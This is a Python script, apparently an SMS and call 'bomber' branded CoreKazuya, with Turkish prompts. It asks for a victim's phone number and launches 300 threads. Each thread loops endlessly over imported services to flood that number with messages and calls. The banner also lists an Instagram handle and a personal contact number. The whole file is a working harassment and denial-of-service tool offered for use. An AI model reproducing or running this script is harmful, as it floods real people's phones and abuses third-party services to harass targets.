import sys, os, pyfiglet
from KazuyaService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
        attack_number_phone.phone(phone)

        while True:
            try:
                attack_number_phone.random_service()
            except Exception as ex:
                print(ex)

os.system('clear')

print(Fore.GREEN + 'CoreKazuya Sms&Call')
print(Fore.GREEN + 'İnstagram: @corekazuya')
print(Fore.GREEN + 'İletişim: +447441431034')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.YELLOW + '============')
phone = input('NUMARA: ')
print('============')

try:
        attack_number_phone.phone(phone)
except:
        print(Fore.RED + 'Yanlış Kullanım Yaptınız ÖRNEK KULLANIM: +905551234567')
        sys.exit()


for i in range(300):
        th = Thread(target=start, args=(phone,))
        th.start()
